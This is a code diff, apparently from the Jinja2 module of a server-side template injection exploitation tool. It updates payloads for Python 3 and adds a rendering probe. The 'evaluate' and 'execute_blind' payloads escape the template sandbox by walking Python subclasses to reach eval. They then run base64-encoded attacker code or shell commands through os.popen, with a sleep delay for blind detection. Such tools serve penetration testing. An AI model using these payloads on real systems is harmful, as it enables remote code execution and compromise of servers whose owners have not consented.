@@ -14,11 +14,19 @@ class Jinja2(python.Python):
                 'render': '{{%(code)s}}',
                 'header': '{{%(header)s}}',
                 'trailer': '{{%(trailer)s}}',
+                'test_render': '(%(n1)s,%(n2)s*%(n3)s)' % {
+                    'n1' : rand.randints[0],
+                    'n2' : rand.randints[1],
+                    'n3' : rand.randints[2]
+                },
+                'test_render_expected': '%(res)s' % {
+                    'res' : (rand.randints[0],rand.randints[1]*rand.randints[2])
+                }
             },
             'evaluate' : {
                 'call': 'render',
                 'evaluate': """''}}{%% set d = "eval(__import__('base64').urlsafe_b64decode('%(code_b64)s'))" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
-{%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
+{%% for b in c.__init__.__globals__.values() %%} {%% if b.__class__ == {}.__class__ %%}
 {%% if 'eval' in b.keys() %%}
 {{ b['eval'](d) }}
 {%% endif %%} {%% endif %%} {%% endfor %%}
@@ -26,8 +34,8 @@ class Jinja2(python.Python):
             },
             'execute_blind' : {
                 'call': 'inject',
-                'execute_blind': """{%% set d = "__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s') + ' && sleep %(delay)i').read()" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
-{%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
+                'execute_blind': """{%% set d = "__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s').decode() + ' && sleep %(delay)i').read()" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
+{%% for b in c.__init__.__globals__.values() %%} {%% if b.__class__ == {}.__class__ %%}
 {%% if 'eval' in b.keys() %%}
 {{ b['eval'](d) }}
 {%% endif %%} {%% endif %%} {%% endfor %%}
